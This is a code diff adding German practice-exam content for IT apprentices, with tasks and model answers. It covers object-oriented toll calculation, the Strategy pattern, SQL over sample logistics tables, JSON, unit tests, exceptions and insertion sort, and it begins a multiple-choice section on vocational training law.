+          {t: '**Warum schnell?** Jeder Aufruf halbiert den Bereich: bei n Elementen höchstens etwa log₂(n) + 1 Aufrufe. Für 12.000 Paletten sind das höchstens **14** Vergleiche statt bis zu 12.000 bei linearer Suche.', b: [['diagram', AP2.dg.flow(['0..7 (8)', '4..7 (4)', '6..7 (2)', '7..7 (1)', 'leer: -1'], {w: 720, h: 100, styles: ['accent', 'accent', 'accent', 'accent', 'bad'], cap: 'Schlimmster Fall bei 8 Elementen: der Bereich halbiert sich bis zur Abbruchbedingung'})]]},
+        ]}]],
+        see: ['eua-rekursion', 'eua-suchen']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 2: Objektorientiert umsetzen (25 Punkte)',
+    ctx: [['h3', 'Anlage: Klassendiagramm Fuhrpark'], ['diagram', {w: 820, h: 360, keep: 680, cap: 'Fuhrpark: abstrakte Klasse Fahrzeug («abstract»), Tour nutzt ein Fahrzeug und hat Sendungen', nodes: [
+      {id: 'fz', k: 'cls', x: 410, y: 80, w: 300, t: {name: ['«abstract»', 'Fahrzeug'], attrs: ['- kennzeichen: String', '- maxNutzlast: double'], ops: ['+ Fahrzeug(kennzeichen: String, maxNutzlast: double)', '+ getKennzeichen(): String', '+ getMaxNutzlast(): double', '+ berechneMaut(km: double): double {abstract}']}},
+      {id: 'lkw', k: 'cls', x: 230, y: 290, w: 300, t: {name: 'Lkw', attrs: ['- achsen: int'], ops: ['+ Lkw(k: String, n: double, achsen: int)', '+ berechneMaut(km: double): double']}},
+      {id: 'tr', k: 'cls', x: 590, y: 290, w: 260, t: {name: 'Transporter', attrs: ['(keine)'], ops: ['+ berechneMaut(km: double): double']}},
+      {id: 'to', k: 'cls', x: 120, y: 80, w: 190, t: {name: 'Tour', attrs: ['- fahrzeug: Fahrzeug', '- sendungen: Sendung[*]'], ops: ['+ istUeberladen(): boolean']}},
+    ], edges: [{a: 'lkw', b: 'fz', ea: 'tri', via: [[230, 205], [410, 205]]}, {a: 'tr', b: 'fz', ea: 'tri', via: [[590, 205], [410, 205]]}, {a: 'to', b: 'fz', ta: '*', tb: '1'}]}],
+      ['p', 'Maut: Ein **Lkw** zahlt je Kilometer **0,35 Euro**, wenn er **mindestens 4 Achsen** hat, sonst **0,27 Euro**. Ein **Transporter** ist mautfrei (0 Euro). Die Klasse **Sendung** hat die Methode getGewicht(): double.']],
+    tasks: [
+      {pts: 8, rows: 12, topic: 'Klassen implementieren', q: 'Implementieren Sie die Klassen **Fahrzeug** und **Lkw** gemäß Klassendiagramm in einer objektorientierten Programmiersprache Ihrer Wahl (Konstruktoren, Getter, Maut).',
+        a: [['codes', [['java', `public abstract class Fahrzeug {
+    private String kennzeichen;
+    private double maxNutzlast;
+
+    public Fahrzeug(String kennzeichen, double maxNutzlast) {
+        this.kennzeichen = kennzeichen;
+        this.maxNutzlast = maxNutzlast;
+    }
+    public String getKennzeichen() { return kennzeichen; }
+    public double getMaxNutzlast() { return maxNutzlast; }
+    public abstract double berechneMaut(double km);
+}
+
+public class Lkw extends Fahrzeug {
+    private int achsen;
+
+    public Lkw(String k, double n, int achsen) {
+        super(k, n);                       // Konstruktor der Oberklasse
+        this.achsen = achsen;
+    }
+    @Override
+    public double berechneMaut(double km) {
+        double satz = (achsen >= 4) ? 0.35 : 0.27;
+        return km * satz;
+    }
+}`], ['csharp', `public abstract class Fahrzeug
+{
+    private string kennzeichen;
+    private double maxNutzlast;
+    public Fahrzeug(string kennzeichen, double maxNutzlast)
+    {
+        this.kennzeichen = kennzeichen;
+        this.maxNutzlast = maxNutzlast;
+    }
+    public string GetKennzeichen() => kennzeichen;
+    public double GetMaxNutzlast() => maxNutzlast;
+    public abstract double BerechneMaut(double km);
+}
+
+public class Lkw : Fahrzeug
+{
+    private int achsen;
+    public Lkw(string k, double n, int achsen) : base(k, n) { this.achsen = achsen; }
+    public override double BerechneMaut(double km) => km * (achsen >= 4 ? 0.35 : 0.27);
+}`], ['python', `from abc import ABC, abstractmethod
+
+class Fahrzeug(ABC):
+    def __init__(self, kennzeichen, max_nutzlast):
+        self.__kennzeichen = kennzeichen
+        self.__max_nutzlast = max_nutzlast
+    def get_kennzeichen(self):
+        return self.__kennzeichen
+    def get_max_nutzlast(self):
+        return self.__max_nutzlast
+    @abstractmethod
+    def berechne_maut(self, km):
+        pass
+
+class Lkw(Fahrzeug):
+    def __init__(self, k, n, achsen):
+        super().__init__(k, n)
+        self.__achsen = achsen
+    def berechne_maut(self, km):
+        return km * (0.35 if self.__achsen >= 4 else 0.27)`]]],
+          'Bewertung: abstrakte Klasse und abstrakte Methode (2 P), private Attribute und Konstruktor (2 P), Getter (1 P), Vererbung mit super-Aufruf (2 P), Mautberechnung (1 P).'],
+        see: ['eua-oop', 'eua-saeulen', 'eua-konstruktor']},
+      {pts: 5, rows: 8, topic: 'Methode implementieren', q: 'Implementieren Sie die Methode **istUeberladen()** der Klasse Tour. Sie liefert true, wenn die Summe der Sendungsgewichte die maximale Nutzlast des Fahrzeugs übersteigt.',
+        a: [['codes', [['java', `public boolean istUeberladen() {
+    double summe = 0;
+    for (Sendung s : sendungen) {
+        summe += s.getGewicht();
+    }
+    return summe > fahrzeug.getMaxNutzlast();
+}`], ['python', `def ist_ueberladen(self):
+    summe = sum(s.get_gewicht() for s in self.__sendungen)
+    return summe > self.__fahrzeug.get_max_nutzlast()`], ['pseudo', `methode istUeberladen(): boolean
+    summe = 0
+    für jede s in sendungen
+        summe = summe + s.getGewicht()
+    ende für
+    rückgabe summe > fahrzeug.getMaxNutzlast()`]]],
+          'Bewertung: Summenvariable (1 P), Schleife über alle Sendungen (2 P), Vergleich mit Nutzlast über Getter (2 P). Kein Zugriff auf private Attribute fremder Klassen!'],
+        see: ['eua-oop']},
+      {pts: 6, rows: 7, topic: 'Polymorphie', q: 'Welche Ausgabe erzeugt das Programm? Erklären Sie an diesem Beispiel die Begriffe **Polymorphie** und **dynamische Bindung**.',
+        ctx: [['code', 'java', `List<Fahrzeug> flotte = new ArrayList<>();
+flotte.add(new Lkw("HB-NL 401", 18000, 5));
+flotte.add(new Lkw("HB-NL 388", 7500, 3));
+flotte.add(new Transporter("HB-NL 512", 1200));
+double summe = 0;
+for (Fahrzeug f : flotte) {
+    double m = f.berechneMaut(100);
+    System.out.println(f.getKennzeichen() + ": " + m);
+    summe += m;
+}
+System.out.println("Summe: " + summe);`]],
+        a: [['out', `HB-NL 401: 35.0
+HB-NL 388: 27.0
+HB-NL 512: 0.0
+Summe: 62.0`],
+          '**Polymorphie** (Vielgestaltigkeit): Eine Variable vom Typ der Oberklasse (Fahrzeug) kann Objekte verschiedener Unterklassen aufnehmen; derselbe Aufruf berechneMaut(100) verhält sich je nach Objekt unterschiedlich.', '**Dynamische (späte) Bindung:** Welche Implementierung ausgeführt wird, entscheidet sich erst **zur Laufzeit** anhand des tatsächlichen Objekttyps (Lkw oder Transporter), nicht anhand des deklarierten Typs.', 'Bewertung: Ausgabe 3 P, Erklärungen 3 P.'],
+        sol: [['seq', {w: 720, actors: ['Schleife', 'Lkw 401 (5 Achsen)', 'Lkw 388 (3 Achsen)', 'Transporter 512'], cap: 'Derselbe Aufruf, drei Implementierungen: entschieden zur Laufzeit', steps: [
+          [0, 1, 'berechneMaut(100)', 's'], [1, 0, '100 x 0,35 = 35.0', 'r'], [0, 2, 'berechneMaut(100)', 's'], [2, 0, '100 x 0,27 = 27.0', 'r'], [0, 3, 'berechneMaut(100)', 's'], [3, 0, '0.0', 'r'], ['note', 0, 'Summe 62.0']]}]],
+        see: ['eua-saeulen', 'eua-interface']},
+      {pts: 6, rows: 8, topic: 'Entwurfsmuster', q: 'NordLog fährt auch nach Österreich und Polen; dort gelten andere Mautregeln. Die Berechnung soll austauschbar sein, ohne die Fahrzeugklassen bei jeder neuen Regel zu ändern. Schlagen Sie ein Entwurfsmuster vor, skizzieren Sie es als Klassendiagramm und nennen Sie zwei Vorteile.',
+        a: ['**Strategie-Muster (Strategy):** Eine Schnittstelle **MautStrategie** mit der Methode berechne(fahrzeug, km). Je Land eine Klasse (**MautDE**, **MautAT**, **MautPL**). Die Tour (Kontext) hält eine Referenz auf eine MautStrategie und delegiert die Berechnung; die Strategie kann zur Laufzeit gewechselt werden.', 'Vorteile: **Offen-geschlossen-Prinzip** (neues Land = neue Klasse, kein Ändern bestehender Klassen), keine langen if/switch-Ketten, Strategien einzeln testbar, Austausch zur Laufzeit.', 'Bewertung: Muster benannt (1 P), Diagramm mit Schnittstelle, Implementierungen und Kontext (3 P), zwei Vorteile (2 P).'],
+        sol: [['diagram', {w: 800, h: 330, keep: 660, cap: 'Strategie-Muster: Tour delegiert an eine austauschbare MautStrategie (gestrichelt mit Dreieck = Realisierung)', nodes: [
+          {id: 'ctx', k: 'cls', x: 130, y: 80, w: 220, t: {name: 'Tour', attrs: ['- strategie: MautStrategie'], ops: ['+ setStrategie(s: MautStrategie)', '+ maut(km: double): double']}},
+          {id: 'if', k: 'cls', x: 520, y: 80, w: 300, s: 'accent', t: {name: ['«interface»', 'MautStrategie'], ops: ['+ berechne(f: Fahrzeug, km: double): double']}},
+          {id: 'de', k: 'cls', x: 330, y: 270, w: 160, t: {name: 'MautDE', ops: ['+ berechne(...)']}}, {id: 'at', k: 'cls', x: 520, y: 270, w: 160, t: {name: 'MautAT', ops: ['+ berechne(...)']}},
+          {id: 'pl', k: 'cls', x: 710, y: 270, w: 160, t: {name: 'MautPL', ops: ['+ berechne(...)']}},
+        ], edges: [{a: 'ctx', b: 'if', ea: 'open', tb: '1'}, {a: 'de', b: 'if', ea: 'tri', k: 'dash', via: [[330, 190], [520, 190]]}, {a: 'at', b: 'if', ea: 'tri', k: 'dash'}, {a: 'pl', b: 'if', ea: 'tri', k: 'dash', via: [[710, 190], [520, 190]]}]}],
+          ['code', 'java', `tour.setStrategie(new MautAT());     // Grenzübertritt: Strategie wechseln
+double betrag = tour.maut(120);      // intern: strategie.berechne(fahrzeug, 120)`]],
+        see: ['eua-patterns', 'eua-interface']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 3: Datenbankabfragen erstellen (25 Punkte)',
+    ctx: [['h3', 'Anlage: Datenbankmodell Tracking (Ausschnitt mit Beispieldaten)'],
+      ['diagram', {w: 820, h: 250, keep: 680, cap: 'Tabellen und Beziehungen (Krähenfuß = viele)', nodes: [
+        {id: 'k', k: 'cls', x: 100, y: 80, w: 170, t: {name: 'kunde', attrs: ['PK kunde_id', 'firma', 'ort']}},
+        {id: 's', k: 'cls', x: 330, y: 80, w: 190, t: {name: 'sendung', attrs: ['PK sendung_id', 'FK kunde_id', 'gewicht_kg', 'status', 'erfasst_am (DATE)']}},
+        {id: 'ts', k: 'cls', x: 560, y: 80, w: 180, t: {name: 'tour_sendung', attrs: ['PK, FK tour_id', 'PK, FK sendung_id', 'stopp_nr']}},
+        {id: 't', k: 'cls', x: 560, y: 205, w: 180, t: {name: 'tour', attrs: ['PK tour_id', 'datum', 'FK fahrer_id', 'kennzeichen']}},
+        {id: 'f', k: 'cls', x: 330, y: 205, w: 170, t: {name: 'fahrer', attrs: ['PK fahrer_id', 'name']}},
+      ], edges: [{a: 's', b: 'k', sa: 'many', ea: 'one'}, {a: 'ts', b: 's', sa: 'many', ea: 'one'}, {a: 'ts', b: 't', sa: 'many', ea: 'one'}, {a: 't', b: 'f', sa: 'many', ea: 'one'}]}],
+      ['row', [['table', ['kunde_id', 'firma', 'ort'], [['1', 'Hansa Kaffee AG', 'Bremen'], ['2', 'Fisch & Co. KG', 'Bremerhaven'], ['3', 'Weser Möbel GmbH', 'Verden'], ['4', 'Nordsee Bau GmbH', 'Cuxhaven']]],
+        ['table', ['fahrer_id', 'name'], [['2', 'Tom Kruse'], ['5', 'Ali Demir'], ['7', 'Jana Wiese'], ['9', 'Lea Brandt']]]]],
+      ['table', ['sendung_id', 'kunde_id', 'gewicht_kg', 'status', 'erfasst_am'], [['501', '1', '620', 'unterwegs', '2026-03-02'], ['502', '2', '480', 'unterwegs', '2026-03-02'], ['503', '1', '910', 'zugestellt', '2026-03-03'], ['504', '3', '750', 'unterwegs', '2026-03-04'], ['505', '1', '200', 'erfasst', '2026-03-05'], ['506', '3', '1100', 'unterwegs', '2026-03-05'], ['507', '2', '300', 'zugestellt', '2026-02-27'], ['508', '3', '90', 'erfasst', '2026-03-06']]],
+      ['row', [['table', ['tour_id', 'datum', 'fahrer_id', 'kennzeichen'], [['100', '2026-03-03', '7', 'HB-NL 401'], ['101', '2026-03-03', '2', 'HB-NL 388'], ['102', '2026-03-04', '7', 'HB-NL 401'], ['103', '2026-03-05', '5', 'HB-NL 512']]],
+        ['table', ['tour_id', 'sendung_id', 'stopp_nr'], [['100', '501', '1'], ['100', '502', '2'], ['101', '503', '1'], ['102', '502', '1'], ['102', '504', '2'], ['103', '506', '1']]]]]],
+    tasks: [
+      {pts: 3, topic: 'SELECT', q: 'Geben Sie alle Sendungen mit Status "unterwegs" aus, die schwerer als 500 kg sind, absteigend nach Gewicht sortiert (sendung_id, gewicht_kg).',
+        a: [['code', 'sql', `SELECT sendung_id, gewicht_kg
+FROM sendung
+WHERE status = 'unterwegs'
+  AND gewicht_kg > 500
+ORDER BY gewicht_kg DESC;`], ['table', ['sendung_id', 'gewicht_kg'], [['506', '1100'], ['504', '750'], ['501', '620']]], 'Sendung 502 fehlt (480 kg), 503 ist zugestellt.'],
+        see: ['eua-sqlselect']},
+      {pts: 5, topic: 'JOIN, GROUP BY, HAVING', q: 'Ermitteln Sie je Kunde (Firma) die Anzahl der im **März 2026** erfassten Sendungen und deren Gesamtgewicht. Es sollen nur Kunden mit **mehr als 2** Sendungen erscheinen, sortiert nach Gesamtgewicht absteigend.',
+        a: [['code', 'sql', `SELECT k.firma,
+       COUNT(*)          AS anzahl,
+       SUM(s.gewicht_kg) AS gesamtgewicht
+FROM kunde k
+JOIN sendung s ON s.kunde_id = k.kunde_id
+WHERE s.erfasst_am BETWEEN '2026-03-01' AND '2026-03-31'
+GROUP BY k.kunde_id, k.firma
+HAVING COUNT(*) > 2
+ORDER BY gesamtgewicht DESC;`], ['table', ['firma', 'anzahl', 'gesamtgewicht'], [['Weser Möbel GmbH', '3', '1940'], ['Hansa Kaffee AG', '3', '1730']]],
+          'Bewertung: JOIN (1 P), WHERE-Zeitraum (1 P), GROUP BY mit Aggregaten (1 P), HAVING (1 P), ORDER BY (1 P).'],
+        sol: [['walk', {t: 'So rechnet die Datenbank', steps: [
+          {t: '**FROM + JOIN:** Jede Sendung bekommt ihre Firma.'},
+          {t: '**WHERE:** Sendung 507 (27.02.) fällt heraus. Es bleiben 501 bis 506 und 508.', b: [['table', ['firma', 'sendung_id', 'gewicht_kg'], [['Hansa Kaffee AG', '501', '620'], ['Hansa Kaffee AG', '503', '910'], ['Hansa Kaffee AG', '505', '200'], ['Fisch & Co. KG', '502', '480'], ['Weser Möbel GmbH', '504', '750'], ['Weser Möbel GmbH', '506', '1100'], ['Weser Möbel GmbH', '508', '90']]]]},
+          {t: '**GROUP BY:** Eine Zeile je Kunde mit COUNT und SUM.', b: [['table', ['firma', 'anzahl', 'gesamtgewicht'], [['Hansa Kaffee AG', '3', '1730'], ['Fisch & Co. KG', '1', '480'], ['Weser Möbel GmbH', '3', '1940']]]]},
+          {t: '**HAVING COUNT(*) > 2:** Fisch & Co. fällt heraus (nur 1). **ORDER BY** sortiert: Weser Möbel 1940 vor Hansa Kaffee 1730.', b: [['merk', 'Reihenfolge der Auswertung: **FROM/JOIN, WHERE, GROUP BY, HAVING, SELECT, ORDER BY**. WHERE filtert Zeilen, HAVING filtert Gruppen.']]},
+        ]}]],
+        see: ['eua-sqljoin', 'eua-sqlgroup']},
+      {pts: 5, topic: 'Unterabfrage', q: 'Geben Sie die Namen aller Fahrer aus, die am **03.03.2026 keine Tour** gefahren sind.',
+        a: [['codes', [['sql', `-- Variante 1: NOT EXISTS
+SELECT f.name
+FROM fahrer f
+WHERE NOT EXISTS (
+    SELECT 1 FROM tour t
+    WHERE t.fahrer_id = f.fahrer_id
+      AND t.datum = '2026-03-03'
+);
+
+-- Variante 2: LEFT JOIN mit Bedingung im ON-Teil
+SELECT f.name
+FROM fahrer f
+LEFT JOIN tour t ON t.fahrer_id = f.fahrer_id AND t.datum = '2026-03-03'
+WHERE t.tour_id IS NULL;`]]], ['table', ['name'], [['Ali Demir'], ['Lea Brandt']]],
+          ['warn', 'Falle: Steht die Datumsbedingung beim LEFT JOIN im **WHERE** statt im **ON**, werden die NULL-Zeilen wieder herausgefiltert und das Ergebnis ist leer. Auch **NOT IN** funktioniert, wird aber falsch, sobald die Unterabfrage NULL liefert.']],
+        see: ['eua-sqljoin', 'eua-sqlexam']},
+      {pts: 4, topic: 'UPDATE', q: 'Alle Sendungen der **Tour 102** wurden zugestellt. Setzen Sie ihren Status mit einer Anweisung auf "zugestellt". Wie viele Zeilen sind betroffen?',
+        a: [['code', 'sql', `UPDATE sendung
+SET status = 'zugestellt'
+WHERE sendung_id IN (SELECT sendung_id
+                     FROM tour_sendung
+                     WHERE tour_id = 102);`], 'Betroffen sind **2 Zeilen** (Sendungen 502 und 504).', 'Bewertung: UPDATE/SET (1 P), Unterabfrage über tour_sendung (2 P), Anzahl (1 P).'],
+        see: ['eua-sqldml']},
+      {pts: 4, topic: 'CREATE TABLE', q: 'Schreiben Sie die SQL-Anweisung, mit der die Tabelle **tour_sendung** angelegt wird (Datentypen, zusammengesetzter Primärschlüssel, Fremdschlüssel). Beim Löschen einer Tour sollen ihre Zuordnungen automatisch mit gelöscht werden.',
+        a: [['code', 'sql', `CREATE TABLE tour_sendung (
+    tour_id     INT NOT NULL,
+    sendung_id  INT NOT NULL,
+    stopp_nr    SMALLINT NOT NULL CHECK (stopp_nr > 0),
+    PRIMARY KEY (tour_id, sendung_id),
+    FOREIGN KEY (tour_id)    REFERENCES tour(tour_id) ON DELETE CASCADE,
+    FOREIGN KEY (sendung_id) REFERENCES sendung(sendung_id)
+);`], 'Bewertung: Spalten mit Typen (1 P), zusammengesetzter PK (1 P), zwei FKs (1 P), ON DELETE CASCADE (1 P).'],
+        see: ['eua-sqldml', 'eua-sqler']},
+      {pts: 4, topic: 'Index', q: 'Das Tracking-Portal sucht sehr häufig mit WHERE kunde_id = ? nach Sendungen. Erklären Sie, was ein Index ist, wie er hier hilft und nennen Sie einen Nachteil. Geben Sie die SQL-Anweisung an.',
+        a: ['Ein **Index** ist eine zusätzliche, sortierte Datenstruktur (meist **B-Baum**) mit Verweisen auf die Zeilen, ähnlich einem Stichwortverzeichnis. Statt alle Zeilen zu lesen (Full Table Scan, O(n)), findet die Datenbank die passenden Zeilen in etwa O(log n).', 'Nachteile: **zusätzlicher Speicher**, **INSERT/UPDATE/DELETE werden langsamer**, weil der Index mitgepflegt wird. Sinnvoll für häufig gefilterte, gejointe oder sortierte Spalten mit vielen verschiedenen Werten.', ['code', 'sql', 'CREATE INDEX idx_sendung_kunde ON sendung (kunde_id);']],
+        see: ['eua-sqlexam', 'eua-baeume']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 4: Daten austauschen und Qualität sichern (25 Punkte)',
+    tasks: [
+      {pts: 6, rows: 10, topic: 'JSON', q: 'Die Scanner-App überträgt Sendungen als JSON. a) Erstellen Sie ein JSON-Dokument für **Sendung 504** (Gewicht 750 kg, Status unterwegs) mit dem Kunden als **eingebettetem Objekt** (ID, Firma, Ort) und einer **Liste der Stopps** (Tour 102, Stopp 2). Das Feld zustellzeit ist noch unbekannt. b) Nennen Sie zwei Unterschiede zwischen JSON und XML.',
+        a: [['code', 'json', `{
+  "sendungId": 504,
+  "gewichtKg": 750,
+  "status": "unterwegs",
+  "kunde": {
+    "kundeId": 3,
+    "firma": "Weser Möbel GmbH",
+    "ort": "Verden"
+  },
+  "stopps": [
+    { "tourId": 102, "stoppNr": 2 }
+  ],
+  "zustellzeit": null
+}`], 'a) Bewertung: Objekt mit Schlüssel-Wert-Paaren (1 P), Zahl ohne Anführungszeichen, Zeichenkette mit (1 P), eingebettetes Objekt (1 P), Array (1 P), null (bei Fehlen 0 P Abzug, wenn begründet weggelassen).',
+          'b) JSON ist **kompakter** (keine schließenden Tags), kennt **Datentypen** (Zahl, Boolean, null, Array); XML hat **Attribute und Namensräume**, kann mit **XSD** validiert und mit XSLT transformiert werden; JSON ist in JavaScript direkt verarbeitbar.'],
+        see: ['eua-formate']},
+      {pts: 7, rows: 10, topic: 'Unit-Test', q: 'Die Methode **berechnePreis(gewichtKg, express)** berechnet den Frachtpreis: **25,00 Euro** bis einschließlich 100 kg, für **jede angefangenen weiteren 100 kg** zusätzlich **12,00 Euro**. Express kostet **30 % Aufschlag**. Gewichte kleiner oder gleich 0 oder über 1.200 kg lösen eine **IllegalArgumentException** aus. a) Geben Sie fünf Testfälle mit Eingabe und erwartetem Ergebnis an, darunter Grenzwerte. b) Schreiben Sie einen Unit-Test (zum Beispiel JUnit 5), der die Ausnahme bei 0 kg prüft.',
+        a: [['table', ['Nr.', 'gewichtKg', 'express', 'erwartet', 'Begründung'], [['1', '100', 'false', '25,00', 'Grenze Grundpreis'], ['2', '101', 'false', '37,00', 'erste angefangene 100 kg'], ['3', '250', 'false', '49,00', '25 + 2 x 12'], ['4', '250', 'true', '63,70', '49 x 1,3'], ['5', '1200', 'false', '157,00', '25 + 11 x 12, obere Grenze'], ['6', '0 / 1201', 'false', 'Exception', 'ungültige Grenzen']]],
+          ['codes', [['java', `@Test
+void nullKgWirftAusnahme() {
+    Frachtrechner r = new Frachtrechner();
+    assertThrows(IllegalArgumentException.class,
+                 () -> r.berechnePreis(0, false));
+}
+
+@Test
+void grenzeHundertEinsKg() {
+    assertEquals(37.00, new Frachtrechner().berechnePreis(101, false), 0.001);
+}`], ['python', `import pytest
+
+def test_null_kg_wirft_ausnahme():
+    with pytest.raises(ValueError):
+        berechne_preis(0, False)
+
+def test_grenze_101_kg():
+    assert berechne_preis(101, False) == pytest.approx(37.00)`]]],
+          'Bewertung: a) 5 Testfälle je 0,8 P (4 P), b) Testmethode mit Erwartung der Ausnahme 3 P.'],
+        sol: [['chart', {kind: 'line', w: 720, h: 280, labels: ['0', '100', '101', '200', '201', '300', '400', '500', '600'], series: [{n: 'Preis normal (Euro)', d: [null, 25, 37, 37, 49, 49, 61, 73, 85], k: 'accent'}], ymax: 100, yl: 'Euro', cap: 'Stufenfunktion: An jeder 100-kg-Grenze springt der Preis. Genau dort liegen die wichtigsten Testfälle.'}]],
+        see: ['eua-unittest', 'eua-testfaelle']},
+      {pts: 6, rows: 8, topic: 'Exceptions', q: 'Welche Ausgabe erzeugt das folgende Programm? Begründen Sie die Rolle des finally-Blocks.',
+        ctx: [['code', 'java', `static int lade(int[] p, int i) {
+    try {
+        System.out.println("A");
+        int x = 100 / p[i];
+        System.out.println("B");
+        return x;
+    } catch (ArithmeticException e) {
+        System.out.println("C");
+        return -1;
+    } finally {
+        System.out.println("D");
+    }
+}
+
+public static void main(String[] args) {
+    int[] p = {4, 0};
+    System.out.println(lade(p, 0));
+    System.out.println(lade(p, 1));
+    try {
+        lade(p, 2);
+    } catch (ArrayIndexOutOfBoundsException e) {
+        System.out.println("E");
+    }
+}`]],
+        a: [['out', `A
+B
+D
+25
+A
+C
+D
+-1
+A
+D
+E`], 'finally wird **immer** ausgeführt: nach normalem return (D vor 25), nach dem catch (D vor -1) und auch, wenn die Ausnahme **nicht gefangen** wird (Index 2: ArrayIndexOutOfBoundsException passt nicht zum catch, D wird ausgegeben, dann fängt main die Ausnahme und gibt E aus). Typisch für Aufräumarbeiten (Datei, Verbindung schließen).', 'Bewertung: drei Aufrufe je 1,5 P, Begründung 1,5 P.'],
+        sol: [['walk', {t: 'Ablauf der drei Aufrufe', steps: [
+          {t: '**lade(p, 0):** 100 / 4 = 25, kein Fehler. "A", "B", dann return 25; **vor** dem Verlassen läuft finally: "D". main gibt 25 aus.', b: [['diagram', AP2.dg.flow(['try: A', '100/4 = 25', 'B, return 25', 'finally: D', 'main: 25'], {w: 760, h: 100, styles: ['accent', 'ok', 'ok', 'gold', 'plain']})]]},
+          {t: '**lade(p, 1):** 100 / 0 wirft ArithmeticException. "B" wird übersprungen, catch gibt "C" aus und return -1, finally "D".', b: [['diagram', AP2.dg.flow(['try: A', '100/0: Fehler', 'catch: C, return -1', 'finally: D', 'main: -1'], {w: 760, h: 100, styles: ['accent', 'bad', 'ok', 'gold', 'plain']})]]},
+          {t: '**lade(p, 2):** p[2] existiert nicht: ArrayIndexOutOfBoundsException. Kein passendes catch in lade, finally gibt trotzdem "D" aus, die Ausnahme geht an main, dort "E".', b: [['diagram', AP2.dg.flow(['try: A', 'p[2]: Fehler', 'kein passendes catch', 'finally: D', 'main-catch: E'], {w: 760, h: 100, styles: ['accent', 'bad', 'plain', 'gold', 'ok']})]]},
+        ]}]],
+        see: ['eua-exceptions']},
+      {pts: 6, rows: 8, topic: 'Sortieren', q: 'Die Gewichte [620, 480, 910, 200, 750] sollen mit **Insertion Sort** (Sortieren durch Einfügen) aufsteigend sortiert werden. a) Geben Sie den Zustand des Feldes nach jedem Durchlauf der äußeren Schleife an. b) Nennen Sie die Laufzeit im besten und schlechtesten Fall und erklären Sie, wann der beste Fall eintritt.',
+        a: [['table', ['Durchlauf', 'eingefügtes Element', 'Feld danach'], [['Start', '-', '620, 480, 910, 200, 750'], ['1', '480', '**480, 620**, 910, 200, 750'], ['2', '910', '**480, 620, 910**, 200, 750'], ['3', '200', '**200, 480, 620, 910**, 750'], ['4', '750', '**200, 480, 620, 750, 910**']]],
+          'b) Bester Fall **O(n)**, wenn das Feld **bereits sortiert** ist (jedes Element wird nur einmal verglichen). Schlechtester Fall **O(n²)** bei umgekehrt sortiertem Feld. Insertion Sort ist **stabil** und arbeitet **in-place**.', 'Bewertung: a) 4 P, b) 2 P.'],
+        sol: [['walk', {t: 'Insertion Sort als Balkendiagramm', steps: [
+          {t: '**Start:** Der linke Teil (nur 620) gilt als sortiert.', b: [bars([620, 480, 910, 200, 750], 0, 'Ausgangsfeld')]},
+          {t: '**Durchlauf 1:** 480 wird gezogen; 620 > 480 rückt nach rechts, 480 an Index 0.', b: [bars([480, 620, 910, 200, 750], 0, 'nach Durchlauf 1')]},
+          {t: '**Durchlauf 2:** 910 ist größer als 620, bleibt stehen (nur ein Vergleich).', b: [bars([480, 620, 910, 200, 750], 2, 'nach Durchlauf 2')]},
+          {t: '**Durchlauf 3:** 200 wandert an allen drei vorbei ganz nach vorn (3 Verschiebungen).', b: [bars([200, 480, 620, 910, 750], 0, 'nach Durchlauf 3')]},
+          {t: '**Durchlauf 4:** 750 rückt vor 910. Fertig.', b: [bars([200, 480, 620, 750, 910], 3, 'sortiert'), ['tool', 'sort']]},
+        ]}]],
+        see: ['eua-sortieren']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/wiso3-1.js
+// Probeprüfung 3, Wirtschafts- und Sozialkunde: gebundene Aufgaben mit automatischer Auswertung (Situation NordLog Spedition GmbH).
+(function () {
+  const ID = 'exam3-wiso';
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 3 (Logistik)', t: 'Wirtschafts- und Sozialkunde (gebundene Aufgaben)', blocks: []});
+  AP2.exam.start(ID, {minutes: 60, cover: AP2.exam.COVER.wiso,
+    hint: 'Wie in der echten Prüfung: 60 Minuten, 100 Punkte, nur gebundene Aufgaben. Jede Aufgabe wird beim Auswerten automatisch bewertet und erklärt.',
+    intro: [['p', 'Sie sind Auszubildende bzw. Auszubildender zum Fachinformatiker für Anwendungsentwicklung bei der **NordLog Spedition GmbH** in Bremen (220 Beschäftigte, Betriebsrat vorhanden, tarifgebunden). Die folgenden Aufgaben beziehen sich auf Situationen aus Ihrem Betrieb.']]});
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 1: Ausbildung und Arbeitsrecht (37 Punkte)',
+    tasks: [
+      {pts: 3, topic: 'BBiG', q: 'Ihr Ausbildungsvertrag sieht eine Probezeit vor. Welche Regelung entspricht dem Berufsbildungsgesetz?',
+        mc: {o: ['Die Probezeit beträgt mindestens 1 Monat und höchstens 4 Monate.', 'Die Probezeit beträgt genau 6 Monate wie bei Arbeitsverträgen.', 'Die Probezeit kann bis zu 6 Monate betragen, wenn der Betriebsrat zustimmt.', 'Eine Probezeit ist nur bei minderjährigen Auszubildenden zulässig.'], c: [0]},
+        a: ['§ 20 BBiG: Das Ausbildungsverhältnis **beginnt mit der Probezeit**, sie muss **mindestens einen Monat und darf höchstens vier Monate** betragen. In der Probezeit können beide Seiten **jederzeit ohne Frist** kündigen (schriftlich).'], see: ['wiso-bbig']},
+      {pts: 3, topic: 'Kündigung Ausbildung', q: 'Nach der Probezeit möchte eine Mitauszubildende die Ausbildung beenden, weil sie Medizin studieren will. Wie kann sie kündigen?',
+        mc: {o: ['Gar nicht, nach der Probezeit ist eine Kündigung durch Auszubildende ausgeschlossen.', 'Mündlich mit einer Frist von zwei Wochen.', 'Schriftlich unter Angabe des Grundes mit einer Frist von vier Wochen, weil sie die Berufsausbildung aufgibt.', 'Schriftlich ohne Frist und ohne Angabe von Gründen.'], c: [2]},
+        a: ['§ 22 Abs. 2 BBiG: Nach der Probezeit können Auszubildende mit einer **Frist von vier Wochen** kündigen, wenn sie die **Berufsausbildung aufgeben** oder sich für eine andere Berufstätigkeit ausbilden lassen wollen. Die Kündigung muss **schriftlich** und **unter Angabe der Gründe** erfolgen. Ausbildende können nach der Probezeit nur fristlos aus wichtigem Grund kündigen.'], see: ['wiso-bbig', 'wiso-kuendigung']},
